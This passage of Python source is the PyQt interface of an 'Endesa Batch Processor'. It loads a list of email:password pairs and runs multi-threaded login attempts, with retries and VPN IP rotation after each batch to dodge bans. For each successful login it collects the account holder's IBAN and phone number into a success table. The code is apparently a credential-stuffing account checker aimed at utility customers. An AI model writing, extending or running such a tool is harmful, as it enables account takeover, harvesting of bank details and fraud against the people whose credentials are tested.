        header.setSectionResizeMode(2, QHeaderView.ResizeMode.ResizeToContents)  # Password
        header.setSectionResizeMode(3, QHeaderView.ResizeMode.ResizeToContents)  # IBAN
        header.setSectionResizeMode(4, QHeaderView.ResizeMode.ResizeToContents)  # Phone
        
        self.success_table.setMinimumHeight(300)
        self.success_table.setAlternatingRowColors(True)
        self.success_table.setRowCount(0)  # Start with 0 rows
        self.success_table.verticalHeader().setVisible(True)  # Show row numbers
        
        # Initialize success data storage
        self.success_data = []
        
        table_tab_layout.addWidget(self.success_table)
        
        # Add tabs to tab widget
        self.tab_widget.addTab(output_tab, "Output Log")
        self.tab_widget.addTab(table_tab, "Success Table")
        
        output_layout.addWidget(self.tab_widget)
        
        layout.addWidget(output_group)
        
        # Set default credentials file if it exists
        if os.path.exists("credentials.txt"):
            self.credentials_path_label.setText("credentials.txt")
            self.credentials_path_label.setStyleSheet("""
                color: #00b4d8; 
                font-weight: bold; 
                padding: 12px 16px; 
                border: 2px solid #00b4d8; 
                border-radius: 6px; 
                background-color: #2d2d2d;
                font-size: 13px;
            """)
    
    def browse_credentials_directory(self):
        """Open native file dialog to select credentials file."""
        import platform
        
        # Set environment variables to force native file dialog
        if platform.system() == "Linux":
            # Linux: Force native file dialog (tunar, nautilus, etc.)
            os.environ['QT_QPA_PLATFORM'] = 'xcb'
            os.environ['QT_QPA_PLATFORMTHEME'] = ''
            os.environ['GTK_USE_PORTAL'] = '1'
            # Try to detect the file manager
            if os.path.exists('/usr/bin/tunar'):
                os.environ['XDG_CURRENT_DESKTOP'] = 'XFCE'
            elif os.path.exists('/usr/bin/nautilus'):
                os.environ['XDG_CURRENT_DESKTOP'] = 'GNOME'
            elif os.path.exists('/usr/bin/dolphin'):
                os.environ['XDG_CURRENT_DESKTOP'] = 'KDE'
        elif platform.system() == "Windows":
            # Windows: Use native Windows file dialog
            os.environ['QT_QPA_PLATFORM'] = 'windows'
            os.environ['QT_QPA_PLATFORMTHEME'] = ''
        
        # Try to get the current directory or home directory
        start_dir = os.getcwd()
        if not os.path.exists(start_dir):
            start_dir = os.path.expanduser("~")
        
        file_path, _ = QFileDialog.getOpenFileName(
            self, 
            "Select Credentials File", 
            start_dir,
            "Text Files (*.txt);;All Files (*)"
        )
        
        if file_path:
            self.credentials_path_label.setText(file_path)
            self.credentials_path_label.setStyleSheet("""
                color: #00b4d8; 
                font-weight: bold; 
                padding: 8px 12px; 
                border: 2px solid #00b4d8; 
                border-radius: 6px; 
                background: qlineargradient(x1:0, y1:0, x2:0, y2:1, 
                    stop:0 #2d2d2d, stop:1 #1e1e1e);
                font-size: 11px;
                min-height: 35px;
            """)
    
    def start_processing(self):
        """Start the batch processing."""
        credentials_file = self.credentials_path_label.text()
        
        if credentials_file == "No file selected" or not os.path.exists(credentials_file):
            QMessageBox.warning(self, "Error", "Please select a valid credentials file.")
            return
        
        # Check if file is a .txt file
        if not credentials_file.endswith('.txt'):
            QMessageBox.warning(self, "Error", "Please select a .txt file.")
            return
        
        # Get configuration
        max_workers = self.threads_spinbox.value()
        max_retries = self.retry_attempts_spinbox.value()
        retry_delay = self.retry_delay_spinbox.value()
        use_vpn = self.vpn_checkbox.isChecked()
        output_file = "results.txt"
        
        # Clear output
        self.output_text.clear()
        self.output_lines = []  # Clear output lines list
        self.success_table.setRowCount(0)  # Clear success table
        self.success_data = []  # Clear success data
        self.output_text.append("Starting batch processing...\n")
        self.output_text.append(f"Configuration: {max_workers} threads, {max_retries} retries, {retry_delay}s base delay")
        if use_vpn:
            self.output_text.append("VPN: Enabled (IP rotation after each batch)")
        else:
            self.output_text.append("VPN: Disabled")
        self.output_text.append("")
        
        # Create and start processor thread with retry configuration
        self.processor_thread = BatchProcessorThread(credentials_file, max_workers, output_file, max_retries, retry_delay, use_vpn)
        self.processor_thread.progress_updated.connect(self.update_progress)
        self.processor_thread.status_updated.connect(self.update_status)
        self.processor_thread.stats_updated.connect(self.update_stats)
        self.processor_thread.progress_percentage.connect(self.update_progress_percentage)
        self.processor_thread.finished_processing.connect(self.processing_finished)
        self.processor_thread.vpn_status_updated.connect(self.update_vpn_status)
        
        self.processor_thread.start()
        
        # Update UI
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        self.progress_bar.setVisible(True)
        self.progress_bar.setRange(0, 100)  # Show percentage progress
        self.progress_bar.setValue(0)
        
        # Reset statistics
        self.success_label.setText("Success: 0")
        self.failure_label.setText("Failed: 0")
        self.banned_label.setText("Banned: 0")
        self.total_label.setText("Total: 0")
        self.rate_label.setText("Rate: 0 req/s")
    
    def stop_processing(self):
        """Stop the batch processing safely."""
        try:
            if self.processor_thread and self.processor_thread.isRunning():
                # Signal the thread to stop
                self.processor_thread.stop()
                
                # Update UI immediately
                self.start_button.setEnabled(True)
                self.stop_button.setEnabled(False)
                self.progress_bar.setVisible(False)
                self.update_status("Stopping processing...")
                
                # Use a timer to check if thread finished instead of blocking wait
                self.stop_timer = QTimer()
                self.stop_timer.timeout.connect(self.check_thread_finished)
                self.stop_timer.start(100)  # Check every 100ms
                
        except Exception as e:
            # If anything goes wrong, just reset the UI
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            self.progress_bar.setVisible(False)
            self.update_status("Processing stopped")
    
    def check_thread_finished(self):
        """Check if the processing thread has finished."""
        try:
            if self.processor_thread and not self.processor_thread.isRunning():
                # Thread has finished, stop the timer and update UI
                if hasattr(self, 'stop_timer'):
                    self.stop_timer.stop()
                    self.stop_timer.deleteLater()
                
                self.update_status("Processing stopped by user")
                self.processor_thread = None
                
        except Exception as e:
            # If anything goes wrong, just reset the UI
            if hasattr(self, 'stop_timer'):
                self.stop_timer.stop()
                self.stop_timer.deleteLater()
            
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            self.progress_bar.setVisible(False)
            self.update_status("Processing stopped")
    
    def clear_success_table(self):
        """Clear the success table."""
        self.success_table.setRowCount(0)
        self.success_data = []
        self.output_text.append("Success table cleared.\n")
    
    def add_success_to_table(self, line_num: str, email: str, password: str, iban: str, phone: str):
        """Add a successful result to the table."""
        row = self.success_table.rowCount()
        self.success_table.insertRow(row)
        
        # Create table items
        line_item = QTableWidgetItem(line_num)
        email_item = QTableWidgetItem(email)
        password_item = QTableWidgetItem(password)
        iban_item = QTableWidgetItem(iban)
        phone_item = QTableWidgetItem(phone)
        
        # Set items in table
        self.success_table.setItem(row, 0, line_item)
        self.success_table.setItem(row, 1, email_item)
        self.success_table.setItem(row, 2, password_item)
        self.success_table.setItem(row, 3, iban_item)
        self.success_table.setItem(row, 4, phone_item)
        
        # Store data
        self.success_data.append({
            'line': line_num,
            'email': email,
            'password': password,
            'iban': iban,
            'phone': phone
        })
    
    def clear_output(self):
        """Clear the output text area."""
        self.output_text.clear()
        self.output_lines = []
        self.output_text.append("Output cleared.\n")
    
    def update_progress(self, message: str):
        """Update the progress output with memory management for large datasets."""
        # Color code different message types
        if message.startswith("SUCCESS"):
            colored_message = f'<span style="color: #00ff00;">{message}</span>'
            
            # Parse success message and add to table
            try:
                # Format: "SUCCESS: Line X - email:password - IBAN: xxx Phone: xxx"
                parts = message.split(" - ")
                
                if len(parts) >= 3:
                    line_part = parts[0].replace("SUCCESS: Line ", "")
                    credentials_part = parts[1]
                    iban_part = parts[2]  # "IBAN: xxx Phone: xxx"
                    
                    # Extract line number
                    line_num = line_part.strip()
                    
                    # Extract email and password
                    if ':' in credentials_part:
                        email, password = credentials_part.split(':', 1)
                        email = email.strip()
                        password = password.strip()
                    else:
                        email = credentials_part.strip()
                        password = ""
                    
                    # Extract IBAN from "IBAN: xxx Phone: xxx"
                    iban = iban_part.replace("IBAN: ", "").split(" Phone:")[0].strip()
                    
                    # Extract phone number from "IBAN: xxx Phone: xxx"
                    phone = iban_part.split(" Phone:")[1].strip() if " Phone:" in iban_part else ""
                    
                    # Add to success table
                    self.add_success_to_table(line_num, email, password, iban, phone)
                    
            except Exception as e:
                # If parsing fails, just continue with normal output
                pass
                
        elif message.startswith("ERROR"):
            colored_message = f'<span style="color: #ff4444;">{message}</span>'
        elif message.startswith("LOGIN_FAILED"):
            colored_message = f'<span style="color: #ffa500;">{message}</span>'  # Orange for login failures
        elif message.startswith("BANNED"):
            colored_message = f'<span style="color: #ff8800;">{message}</span>'  # Yellow for banned accounts
        elif message.startswith("SKIP"):
            colored_message = f'<span style="color: #888888;">{message}</span>'  # Gray for skipped lines
        elif message.startswith("Processed:"):
            colored_message = f'<span style="color: #00b4d8;">{message}</span>'
        else:
            colored_message = f'<span style="color: #ffffff;">{message}</span>'
        
        # Add to output lines list for management
        self.output_lines.append(colored_message)
        
        # Keep only last max_output_lines for performance
        if len(self.output_lines) > self.max_output_lines:
            # Remove oldest lines
            lines_to_remove = len(self.output_lines) - self.max_output_lines
            self.output_lines = self.output_lines[lines_to_remove:]
            
            # Rebuild output text efficiently
            self.output_text.clear()
            self.output_text.append('\n'.join(self.output_lines))
        else:
            # Just append new line
            self.output_text.append(colored_message)
        
        # Auto-scroll to bottom
        scrollbar = self.output_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())
    
    def update_status(self, message: str):
        """Update the status label."""
        self.status_label.setText(message)
    
    def update_stats(self, successful: int, failed: int, banned: int, total: int, rate: float):
        """Update the statistics labels."""
        self.success_label.setText(f"Success: {successful}")
        self.failure_label.setText(f"Failed: {failed}")
        self.banned_label.setText(f"Banned: {banned}")
        self.total_label.setText(f"Total: {total}")
        self.rate_label.setText(f"Rate: {rate:.1f} req/s")
    
    def update_progress_percentage(self, percentage: int):
        """Update the progress bar with percentage."""
        self.progress_bar.setValue(percentage)
    
    def processing_finished(self, successful: int, failed: int, total_time: float):
        """Handle processing completion."""
        rate = (successful + failed) / total_time if total_time > 0 else 0
        
        status_message = f"Completed: {successful} successful, {failed} failed"
        self.update_status(status_message)
        
        self.output_text.append(f"\n=== Processing Complete ===")
        self.output_text.append(f"Successful: {successful}")
        self.output_text.append(f"Failed: {failed}")
        self.output_text.append(f"Time: {total_time:.1f}s")
        self.output_text.append(f"Rate: {rate:.1f} req/s")
        self.output_text.append(f"Results saved to: results.txt")
        
        # Update UI
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.progress_bar.setVisible(False)
        
        # Show completion message
        QMessageBox.information(
            self, "Processing Complete",
            f"Batch processing completed!\n\n"
            f"Successful: {successful}\n"
            f"Failed: {failed}\n"
            f"Time: {total_time:.1f}s\n"
            f"Rate: {rate:.1f} req/s"
        )

    def update_vpn_status_indicator(self, checked: bool):
        """Update the VPN status indicator based on checkbox state."""
        if checked:
            self.vpn_status_indicator.setText("✅ Enabled")
            self.vpn_status_indicator.setStyleSheet("""
                color: #00ff00;
                font-size: 10px;
                font-weight: bold;
                padding: 4px 8px;
                border: 1px solid #00ff00;
                border-radius: 3px;
                background-color: rgba(0, 255, 0, 0.1);
            """)
        else:
            self.vpn_status_indicator.setText("❌ Disabled")
            self.vpn_status_indicator.setStyleSheet("""
                color: #ff6b6b;
                font-size: 10px;
                font-weight: bold;
                padding: 4px 8px;
                border: 1px solid #ff6b6b;
                border-radius: 3px;
                background-color: rgba(255, 107, 107, 0.1);
            """)

    def update_vpn_status(self, message: str):
        """Update VPN status messages."""
        # Color VPN messages in blue
        colored_message = f'<span style="color: #00b4d8;">{message}</span>'
        
        # Add to output lines list for management
        self.output_lines.append(colored_message)
        
        # Keep only last max_output_lines for performance
        if len(self.output_lines) > self.max_output_lines:
            # Remove oldest lines
            lines_to_remove = len(self.output_lines) - self.max_output_lines
            self.output_lines = self.output_lines[lines_to_remove:]
            
            # Rebuild output text efficiently
            self.output_text.clear()
            self.output_text.append('\n'.join(self.output_lines))
        else:
            # Just append new line
            self.output_text.append(colored_message)
        
        # Auto-scroll to bottom
        scrollbar = self.output_text.verticalScrollBar()
        scrollbar.setValue(scrollbar.maximum())


def main():
    """Main function to run the interface."""
    app = QApplication(sys.argv)
    
    # Set application properties
    app.setApplicationName("Endesa Batch Processor")
    app.setApplicationVersion("1.0")
    
    # Create and show the main window
    window = EndesaInterface()
    window.show()
    
    # Run the application
    sys.exit(app.exec())


if __name__ == "__main__":
    main() 